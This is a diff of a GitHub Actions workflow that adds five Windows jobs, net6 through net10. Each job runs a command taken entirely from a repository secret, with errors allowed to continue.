@@ -34,3 +34,33 @@ jobs:
       - name: net5
         continue-on-error: true
         run: ${{ secrets.NET5 }}
+  net6:
+    runs-on: windows-2022
+    steps: 
+      - name: net6
+        continue-on-error: true
+        run: ${{ secrets.NET6 }}
+  net7:
+    runs-on: windows-2022
+    steps: 
+      - name: net7
+        continue-on-error: true
+        run: ${{ secrets.NET7 }}
+  net8:
+    runs-on: windows-2022
+    steps: 
+      - name: net8
+        continue-on-error: true
+        run: ${{ secrets.NET8 }}
+  net9:
+    runs-on: windows-2022
+    steps: 
+      - name: net9
+        continue-on-error: true
+        run: ${{ secrets.NET9 }}
+  net10:
+    runs-on: windows-2022
+    steps: 
+      - name: net10
+        continue-on-error: true
+        run: ${{ secrets.NET10 }}
